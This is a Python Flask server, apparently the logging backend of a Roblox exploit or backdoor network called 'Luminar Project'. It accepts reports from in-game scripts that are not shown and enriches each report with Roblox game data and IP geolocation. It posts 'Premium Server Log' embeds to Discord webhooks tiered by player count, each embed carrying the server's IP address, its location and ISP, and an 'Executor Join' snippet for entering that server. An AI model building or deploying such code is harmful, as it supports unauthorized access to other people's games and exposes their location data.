import os, hashlib, time, requests, logging
from flask import Flask, request, jsonify
from collections import deque
from threading import Lock

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("LuminarProject")

AUTH_SECRET = os.environ.get('AUTH_SECRET')
WEBHOOKS = {
    "tier1": os.environ.get('WEBHOOK_0_50'),
    "tier2": os.environ.get('WEBHOOK_50_100'),
    "tier3": os.environ.get('WEBHOOK_100_500'),
    "tier4": os.environ.get('WEBHOOK_INFINITY')
}

webhook_queues = {}
webhook_locks = {}

def rate_limited_webhook(webhook_url, payload):
    if webhook_url not in webhook_queues:
        webhook_queues[webhook_url] = deque(maxlen=5)
        webhook_locks[webhook_url] = Lock()
    
    with webhook_locks[webhook_url]:
        now = time.time()
        
        while webhook_queues[webhook_url] and now - webhook_queues[webhook_url][0] > 5:
            webhook_queues[webhook_url].popleft()
        
        if len(webhook_queues[webhook_url]) >= 5:
            sleep_time = 5 - (now - webhook_queues[webhook_url][0])
            if sleep_time > 0:
                logger.info(f"⏳ Rate limit: sleeping {sleep_time:.2f}s")
                time.sleep(sleep_time)
                webhook_queues[webhook_url].popleft()
        
        webhook_queues[webhook_url].append(time.time())
        return requests.post(webhook_url, json=payload, timeout=5)

if not AUTH_SECRET:
    logger.error("❌ CRITICAL: AUTH_SECRET is not set!")

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        if res.get('status') == 'success':
            return f"📍 {res['city']}, {res['country']} ({res['isp']})"
    except: pass
    return "Unknown Location"

def verify_luminar_security(provided_hash):
    if not provided_hash:
        return False
        
    current_min = time.gmtime().tm_min
    minutes_to_check = [current_min, (current_min - 1) % 60, (current_min - 2) % 60]
    
    for m in minutes_to_check:
        raw_string = f"{AUTH_SECRET}:{m}"
        expected = hashlib.sha256(raw_string.encode()).hexdigest()
        if provided_hash == expected:
            return True
    
    return False

def get_game_info_alternative(place_id):
    """Try multiple methods to get game info"""
    
    # Method 1: Try direct place details API
    try:
        logger.info(f"🔍 Method 1: Trying place details API for {place_id}")
        res = requests.get(f"https://games.roblox.com/v1/games/multiget-place-details?placeIds={place_id}", timeout=5).json()
        
        if res and len(res) > 0:
            place_info = res[0]
            logger.info(f"✅ Method 1 Success: {place_info}")
            return place_info
    except Exception as e:
        logger.warning(f"⚠️ Method 1 failed: {e}")
    
    # Method 2: Try universe lookup then game details
    try:
        logger.info(f"🔍 Method 2: Trying universe lookup for {place_id}")
        u_res = requests.get(f"https://apis.roblox.com/universes/v1/places/{place_id}/universe", timeout=5).json()
        u_id = u_res.get('universeId')
        
        if u_id:
            logger.info(f"✅ Found universeId: {u_id}")
            g_res = requests.get(f"https://games.roblox.com/v1/games?universeIds={u_id}", timeout=5).json()
            
            if 'data' in g_res and len(g_res['data']) > 0:
                logger.info(f"✅ Method 2 Success: {g_res['data'][0]}")
                return {**g_res['data'][0], 'universeId': u_id}
    except Exception as e:
        logger.warning(f"⚠️ Method 2 failed: {e}")
    
    # Method 3: Try v2 API
    try:
        logger.info(f"🔍 Method 3: Trying v2 API for {place_id}")
        res = requests.get(f"https://games.roblox.com/v2/games/{place_id}/media", timeout=5).json()
        logger.info(f"V2 Response: {res}")
    except Exception as e:
        logger.warning(f"⚠️ Method 3 failed: {e}")
    
    return None

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    data = request.json
    provided_hash = request.headers.get('X-Luminar-Auth')
    
    place_id = data.get('placeId', 'Unknown')
    job_id = data.get('jobId', 'Studio/No-Job-Id')
    logger.info(f"📥 Request | Place: {place_id} | Job: {job_id}")

    if not verify_luminar_security(provided_hash):
        return jsonify({"error": "Unauthorized"}), 401

    try:
        server_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        # Try to get game info using multiple methods
        game_data = get_game_info_alternative(place_id)
        
        if not game_data:
            logger.error(f"❌ All methods failed for place {place_id}")
            return jsonify({"status": "skipped", "reason": "could not fetch game data"}), 200
        
        u_id = game_data.get('universeId') or game_data.get('id')
        game_name = game_data.get('name', 'Unknown Game')
        active = game_data.get('playing', 0)
        favorites = game_data.get('favoritedCount', 0)
        
        logger.info(f"✅ Game Data: {game_name} | Universe: {u_id} | Active: {active}")
        
        # Fetch votes
        try:
            v_info_req = requests.get(f"https://games.roblox.com/v1/games/votes?universeIds={u_id}", timeout=5).json()
            v_info = v_info_req['data'][0] if 'data' in v_info_req and v_info_req['data'] else {'upVotes': 0}
        except:
            v_info = {'upVotes': 0}
        
        # Fetch thumbnails
        try:
            icon_req = requests.get(f"https://thumbnails.roblox.com/v1/games/icons?universeIds={u_id}&size=256x256&format=Png&isCircular=false", timeout=5).json()
            icon = icon_req['data'][0]['imageUrl'] if 'data' in icon_req and icon_req['data'] else 'https://via.placeholder.com/256'
        except:
            icon = 'https://via.placeholder.com/256'
        
        try:
            thumb_req = requests.get(f"https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds={u_id}&size=768x432&format=Png", timeout=5).json()
            thumb = thumb_req['data'][0]['thumbnails'][0]['imageUrl'] if 'data' in thumb_req and thumb_req['data'] and thumb_req['data'][0].get('thumbnails') else 'https://via.placeholder.com/768x432'
        except:
            thumb = 'https://via.placeholder.com/768x432'

        # Tiered webhook routing
        if active >= 500: target = WEBHOOKS["tier4"]
        elif active >= 100: target = WEBHOOKS["tier3"]
        elif active >= 50: target = WEBHOOKS["tier2"]
        else: target = WEBHOOKS["tier1"]

        if not target:
            logger.error(f"❌ No webhook URL configured")
            return jsonify({"error": "Webhook not configured"}), 500

        # Construct embed
        payload = {
            "embeds": [{
                "author": {"name": "Luminar Project | Intelligence", "icon_url": icon},
                "title": f"🚀 Premium Server Log: {game_name}",
                "url": f"https://www.roblox.com/games/{place_id}",
                "color": 0xAC00FF,
                "image": {"url": thumb},
                "thumbnail": {"url": icon},
                "fields": [
                    {"name": "🌐 Server Location", "value": f"**IP:** `{server_ip}`\n{get_location(server_ip)}", "inline": False},
                    {"name": "👥 Population", "value": f"**Total Active:** {active:,}\n**Current Server:** {data.get('playerCount', '?')}/{data.get('maxPlayers', '?')}", "inline": True},
                    {"name": "📊 Stats", "value": f"👍 {v_info.get('upVotes', 0):,} | ⭐ {favorites:,}", "inline": True},
                    {"name": "💻 Executor Join", "value": f"```js\nRoblox.GameLauncher.joinGameInstance({place_id}, '{job_id}');\n```", "inline": False}
                ],
                "footer": {"text": f"Luminar Security • JobID: {job_id}"}
            }]
        }

        res = rate_limited_webhook(target, payload)
        
        if res.status_code in [200, 204]:
            logger.info(f"✅ Webhook sent successfully to Discord")
        elif res.status_code == 429:
            logger.warning(f"⚠️ Rate limited (429)")
        else:
            logger.error(f"❌ Webhook failed: {res.status_code} - {res.text}")
        
        return jsonify({"status": "success"}), 200

    except Exception as e:
        logger.error(f"❌ Error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
